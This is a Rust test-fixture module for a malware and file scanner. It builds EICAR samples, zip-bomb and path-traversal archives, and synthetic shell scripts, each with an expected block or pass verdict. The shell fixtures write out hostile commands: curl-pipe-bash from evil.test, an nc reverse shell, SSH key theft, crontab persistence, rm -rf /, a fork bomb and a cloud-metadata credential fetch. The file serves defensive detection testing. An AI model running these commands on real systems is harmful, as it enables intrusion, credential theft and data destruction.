//! Threat corpus helpers for test fixtures.
//!
//! Provides structured access to synthetic test samples organized by
//! detection category. All samples are safe, synthetic, and committed
//! to the repository — no real malware is stored. Per spec §43.9.

use std::io::{Cursor, Write};

/// EICAR test string (68 bytes). The universal AV baseline sample.
pub const EICAR: &[u8] = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";

/// Expected SHA-256 of the EICAR test file.
pub const EICAR_SHA256: &str = "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f";

/// Returns the EICAR test string as a byte vector.
#[must_use]
pub fn eicar_plain() -> Vec<u8> {
    EICAR.to_vec()
}

/// Returns EICAR wrapped in a ZIP archive containing `eicar.com`.
#[must_use]
pub fn eicar_zip() -> Vec<u8> {
    let mut buf = Cursor::new(Vec::new());
    {
        let mut zip = zip::ZipWriter::new(&mut buf);
        let options = zip::write::SimpleFileOptions::default();
        zip.start_file("eicar.com", options).ok();
        zip.write_all(EICAR).ok();
        zip.finish().ok();
    }
    buf.into_inner()
}

/// Returns EICAR wrapped in an encrypted ZIP (password: `infected`).
#[must_use]
pub fn eicar_encrypted_zip() -> Vec<u8> {
    let mut buf = Cursor::new(Vec::new());
    {
        let mut zip = zip::ZipWriter::new(&mut buf);
        let options = zip::write::SimpleFileOptions::default()
            .with_aes_encryption(zip::AesMode::Aes256, "infected");
        zip.start_file("eicar.com", options).ok();
        zip.write_all(EICAR).ok();
        zip.finish().ok();
    }
    buf.into_inner()
}

/// Returns EICAR wrapped in a tar.gz archive containing `eicar.com`.
#[must_use]
pub fn eicar_tar_gz() -> Vec<u8> {
    let mut tar_buf = Vec::new();
    {
        let mut builder = tar::Builder::new(&mut tar_buf);
        let mut header = tar::Header::new_gnu();
        header.set_path("eicar.com").ok();
        header.set_size(u64::try_from(EICAR.len()).unwrap_or(0));
        header.set_mode(0o644);
        header.set_cksum();
        builder.append(&header, Cursor::new(EICAR)).ok();
        builder.finish().ok();
    }
    let mut gz_buf = Vec::new();
    {
        let mut encoder =
            flate2::write::GzEncoder::new(&mut gz_buf, flate2::Compression::default());
        encoder.write_all(&tar_buf).ok();
        encoder.finish().ok();
    }
    gz_buf
}

/// Synthetic shell script category for the corpus.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum ShellCategory {
    /// Benign script that does nothing harmful.
    Benign,
    /// Download-and-execute: `curl ... | bash`.
    DownloadAndExecute,
    /// Base64-decoded obfuscated execution.
    ObfuscatedExecution,
    /// Netcat reverse shell.
    ReverseShell,
    /// SSH key file reads.
    CredentialAccess,
    /// Crontab persistence.
    Persistence,
    /// `rm -rf /` destructive behavior.
    Destructive,
    /// Sudo / setuid attempts.
    PrivilegeEscalation,
    /// `eval` of dynamic content.
    DynamicCodeExecution,
    /// Fork bomb.
    ForkBomb,
    /// Cloud metadata access (169.254.169.254).
    CloudMetadataAccess,
}

/// Returns a synthetic shell script for the given detection category.
#[must_use]
pub fn shell_script(category: ShellCategory) -> Vec<u8> {
    match category {
        ShellCategory::Benign => b"#!/bin/bash\necho hello world\n".to_vec(),
        ShellCategory::DownloadAndExecute => {
            b"#!/bin/bash\ncurl -fsSL https://evil.test/install.sh | bash\n".to_vec()
        }
        ShellCategory::ObfuscatedExecution => {
            b"#!/bin/bash\nprintf 'ZWNobyBoZWxsbwo=' | base64 -d | bash\n".to_vec()
        }
        ShellCategory::ReverseShell => {
            b"#!/bin/bash\nnc -e /bin/bash 10.0.0.1 4444\n".to_vec()
        }
        ShellCategory::CredentialAccess => {
            b"#!/bin/bash\ncat ~/.ssh/id_rsa >> /tmp/.exfil\ncat ~/.ssh/id_ed25519 >> /tmp/.exfil\n".to_vec()
        }
        ShellCategory::Persistence => {
            b"#!/bin/bash\n(crontab -l 2>/dev/null; echo '*/5 * * * * /tmp/.backdoor') | crontab -\n".to_vec()
        }
        ShellCategory::Destructive => {
            b"#!/bin/bash\nrm -rf /\n".to_vec()
        }
        ShellCategory::PrivilegeEscalation => {
            b"#!/bin/bash\nsudo -i\n".to_vec()
        }
        ShellCategory::DynamicCodeExecution => {
            b"#!/bin/bash\neval \"$1\"\n".to_vec()
        }
        ShellCategory::ForkBomb => {
            b"#!/bin/bash\n:(){ :|:& };:\n".to_vec()
        }
        ShellCategory::CloudMetadataAccess => {
            b"#!/bin/bash\ncurl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/\n".to_vec()
        }
    }
}

/// Archive hazard type for the corpus.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum ArchiveHazard {
    /// ZIP with path traversal entry (`../../etc/passwd`).
    PathTraversal,
    /// ZIP bomb with high compression ratio.
    ZipBomb,
}

/// Returns a synthetic archive fixture for the given hazard type.
#[must_use]
pub fn archive_hazard(hazard: ArchiveHazard) -> Vec<u8> {
    match hazard {
        ArchiveHazard::PathTraversal => crate::fixtures::path_traversal_zip(),
        ArchiveHazard::ZipBomb => crate::fixtures::zip_bomb(),
    }
}

/// A corpus entry describing a test sample and its expected verdict.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct CorpusEntry {
    /// Human-readable name for this sample.
    pub name: &'static str,
    /// The sample bytes.
    pub bytes: Vec<u8>,
    /// Expected verdict: "block", "warn", or "pass".
    pub expected_verdict: &'static str,
    /// Expected finding category tag, if any.
    pub expected_tag: Option<&'static str>,
}

/// Returns all in-repo corpus entries as a vector.
///
/// Each entry includes the sample bytes, expected verdict, and
/// expected finding tag. Tests can iterate over this list for
/// data-driven testing.
#[must_use]
#[allow(clippy::too_many_lines)]
pub fn all_entries() -> Vec<CorpusEntry> {
    let shell_categories = [
        (ShellCategory::Benign, "pass", None),
        (
            ShellCategory::DownloadAndExecute,
            "block",
            Some("download-and-execute"),
        ),
        (
            ShellCategory::ObfuscatedExecution,
            "block",
            Some("obfuscated-execution"),
        ),
        (ShellCategory::ReverseShell, "block", Some("reverse-shell")),
        (
            ShellCategory::CredentialAccess,
            "block",
            Some("credential-access"),
        ),
        (ShellCategory::Persistence, "block", Some("persistence")),
        (ShellCategory::Destructive, "block", Some("destructive")),
        (
            ShellCategory::PrivilegeEscalation,
            "block",
            Some("privilege-escalation"),
        ),
        (
            ShellCategory::DynamicCodeExecution,
            "block",
            Some("dynamic-code-exec"),
        ),
        (ShellCategory::ForkBomb, "block", Some("fork-bomb")),
        (
            ShellCategory::CloudMetadataAccess,
            "block",
            Some("cloud-metadata"),
        ),
    ];
    let shell_entries: Vec<CorpusEntry> = shell_categories
        .iter()
        .map(|(cat, verdict, tag)| CorpusEntry {
            name: match cat {
                ShellCategory::Benign => "shell/benign.sh",
                ShellCategory::DownloadAndExecute => "shell/download-and-execute.sh",
                ShellCategory::ObfuscatedExecution => "shell/obfuscated-execution.sh",
                ShellCategory::ReverseShell => "shell/reverse-shell.sh",
                ShellCategory::CredentialAccess => "shell/credential-access.sh",
                ShellCategory::Persistence => "shell/persistence.sh",
                ShellCategory::Destructive => "shell/destructive.sh",
                ShellCategory::PrivilegeEscalation => "shell/privilege-escalation.sh",
                ShellCategory::DynamicCodeExecution => "shell/dynamic-code-exec.sh",
                ShellCategory::ForkBomb => "shell/fork-bomb.sh",
                ShellCategory::CloudMetadataAccess => "shell/cloud-metadata.sh",
            },
            bytes: shell_script(*cat),
            expected_verdict: verdict,
            expected_tag: *tag,
        })
        .collect();

    let archive_entries = vec![
        CorpusEntry {
            name: "archive/path-traversal.zip",
            bytes: archive_hazard(ArchiveHazard::PathTraversal),
            expected_verdict: "block",
            expected_tag: Some("path-traversal"),
        },
        CorpusEntry {
            name: "archive/zip-bomb.zip",
            bytes: archive_hazard(ArchiveHazard::ZipBomb),
            expected_verdict: "block",
            expected_tag: Some("zip-bomb"),
        },
    ];

    let eicar_entries = vec![
        CorpusEntry {
            name: "eicar/plain.txt",
            bytes: eicar_plain(),
            expected_verdict: "block",
            expected_tag: Some("eicar"),
        },
        CorpusEntry {
            name: "eicar/eicar.zip",
            bytes: eicar_zip(),
            expected_verdict: "block",
            expected_tag: Some("eicar"),
        },
        CorpusEntry {
            name: "eicar/eicar-encrypted.zip",
            bytes: eicar_encrypted_zip(),
            expected_verdict: "block",
            expected_tag: Some("eicar"),
        },
        CorpusEntry {
            name: "eicar/eicar.tar.gz",
            bytes: eicar_tar_gz(),
            expected_verdict: "block",
            expected_tag: Some("eicar"),
        },
    ];

    shell_entries
        .into_iter()
        .chain(archive_entries)
        .chain(eicar_entries)
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use hex;
    use sha2::{Digest, Sha256};

    #[test]
    fn eicar_string_is_68_bytes() {
        assert_eq!(EICAR.len(), 68);
    }

    #[test]
    fn eicar_sha256_constant_is_correct() {
        let computed = Sha256::digest(EICAR);
        let hex_str = hex::encode(computed);
        assert_eq!(
            hex_str, EICAR_SHA256,
            "EICAR_SHA256 constant must match actual SHA-256 of EICAR bytes"
        );
    }

    #[test]
    fn eicar_zip_has_correct_magic() {
        let zip = eicar_zip();
        assert!(zip.starts_with(b"PK\x03\x04"));
    }

    #[test]
    fn eicar_encrypted_zip_has_correct_magic() {
        let zip = eicar_encrypted_zip();
        assert!(zip.starts_with(b"PK\x03\x04"));
    }

    #[test]
    fn eicar_tar_gz_has_correct_magic() {
        let tar_gz = eicar_tar_gz();
        assert!(tar_gz.starts_with(&[0x1f, 0x8b]));
    }

    #[test]
    fn shell_scripts_all_start_with_shebang() {
        let categories = [
            ShellCategory::Benign,
            ShellCategory::DownloadAndExecute,
            ShellCategory::ObfuscatedExecution,
            ShellCategory::ReverseShell,
            ShellCategory::CredentialAccess,
            ShellCategory::Persistence,
            ShellCategory::Destructive,
            ShellCategory::PrivilegeEscalation,
            ShellCategory::DynamicCodeExecution,
            ShellCategory::ForkBomb,
            ShellCategory::CloudMetadataAccess,
        ];
        for cat in &categories {
            let script = shell_script(*cat);
            assert!(
                script.starts_with(b"#!/bin/bash"),
                "shell script for {cat:?} should start with shebang",
            );
        }
    }

    #[test]
    fn archive_hazards_have_correct_magic() {
        let traversal = archive_hazard(ArchiveHazard::PathTraversal);
        assert!(traversal.starts_with(b"PK\x03\x04"));
        let bomb = archive_hazard(ArchiveHazard::ZipBomb);
        assert!(bomb.starts_with(b"PK\x03\x04"));
    }

    #[test]
    fn all_entries_has_expected_count() {
        let entries = all_entries();
        // 11 shell + 2 archive + 4 eicar = 17
        assert_eq!(
            entries.len(),
            17,
            "expected 17 corpus entries, got {}",
            entries.len()
        );
    }

    #[test]
    fn all_entries_have_unique_names() {
        let entries = all_entries();
        let names: std::collections::HashSet<&str> = entries.iter().map(|e| e.name).collect();
        assert_eq!(
            names.len(),
            entries.len(),
            "corpus entry names must be unique"
        );
    }

    #[test]
    fn all_entries_have_non_empty_bytes() {
        let entries = all_entries();
        for entry in &entries {
            assert!(
                !entry.bytes.is_empty(),
                "entry '{}' has empty bytes",
                entry.name
            );
        }
    }

    #[test]
    fn all_entries_have_valid_verdict() {
        let entries = all_entries();
        for entry in &entries {
            assert!(
                matches!(entry.expected_verdict, "block" | "warn" | "pass"),
                "entry '{}' has invalid verdict '{}'",
                entry.name,
                entry.expected_verdict
            );
        }
    }

    #[test]
    fn benign_shell_is_pass_verdict_and_others_are_block() {
        let entries = all_entries();
        let benign = entries.iter().find(|e| e.name == "shell/benign.sh");
        assert!(benign.is_some_and(|e| e.expected_verdict == "pass"));
        for entry in &entries {
            if entry.name != "shell/benign.sh" {
                assert_eq!(
                    entry.expected_verdict, "block",
                    "entry '{}' should be block, not {}",
                    entry.name, entry.expected_verdict
                );
            }
        }
    }
}
